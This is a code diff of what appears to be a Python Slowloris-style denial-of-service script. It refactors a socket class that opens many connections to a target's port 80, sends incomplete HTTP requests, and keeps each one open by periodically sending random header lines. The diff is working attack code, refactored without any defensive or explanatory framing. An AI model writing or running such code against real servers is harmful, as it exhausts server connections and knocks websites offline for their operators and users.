@@ -16,24 +16,24 @@ REGULAR_HEADERS = [
     "Accept-language: en-US,en,q=0.5"
 ]
 
-class Sock:
+class Sock(socket.socket):
     def __init__(self, target):
         try:
-            self.sock = socket.socket()
-            self.sock.settimeout(4)
-            self.sock.connect((target, 80))
-            self.sock.send(("Get /?%s HTTP/1.1\r\n" % randint(0, 2000)).encode("UTF-8"))
+            super(Sock, self).__init__()
+            self.settimeout(4)
+            self.connect((target, 80))
+            self.send(("Get /?%s HTTP/1.1\r\n" % randint(0, 2000)).encode("UTF-8"))
             for header in REGULAR_HEADERS:
-                self.sock.send(("%s\r\n" % header).encode("UTF-8"))
+                self.send(("%s\r\n" % header).encode("UTF-8"))
         except:
             print("Error making socket")
             pass
 
     def keep_alive(self, list_of_sockets):
         try:
-            self.sock.send(("X-a: %s\r\n" % randint(0, 5000)).encode("UTF-8"))
+            self.send(("X-a: %s\r\n" % randint(0, 5000)).encode("UTF-8"))
         except socket.error:
-            self.sock.close()
+            self.close()
             list_of_sockets.remove(self)
 
 def recreate_sockets(list_of_sockets, max_sockets, target):
